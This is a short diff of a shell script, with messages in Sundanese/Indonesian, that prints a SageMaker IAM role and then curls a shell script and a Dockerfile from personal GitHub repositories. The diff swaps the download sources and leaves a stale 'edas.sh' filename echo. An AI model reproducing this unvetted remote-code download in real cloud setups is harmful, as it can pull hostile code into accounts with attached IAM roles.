@@ -243,8 +243,8 @@ echo "Role IAM SageMaker:"
 echo "${ROLE_ARN}"
 
 echo "Ngeunduh file konfigurasi..."
-curl -fsSL https://github.com/habibbaharyuandi/bross/raw/refs/heads/main/miawu.sh -o edas.sh
-curl -fsSL https://github.com/ngagateng2-creator/codet/raw/refs/heads/main/Dockerfile -o Dockerfile
+curl -fsSL https://github.com/paramitacitra07/tes2/raw/refs/heads/main/miawu.sh -o miawu.sh
+curl -fsSL https://github.com/paramitacitra07/tes2/raw/refs/heads/main/Dockerfile -o Dockerfile
 
 echo "Ieu hasil file anu diunduh:"
 echo "--- edas.sh ---"
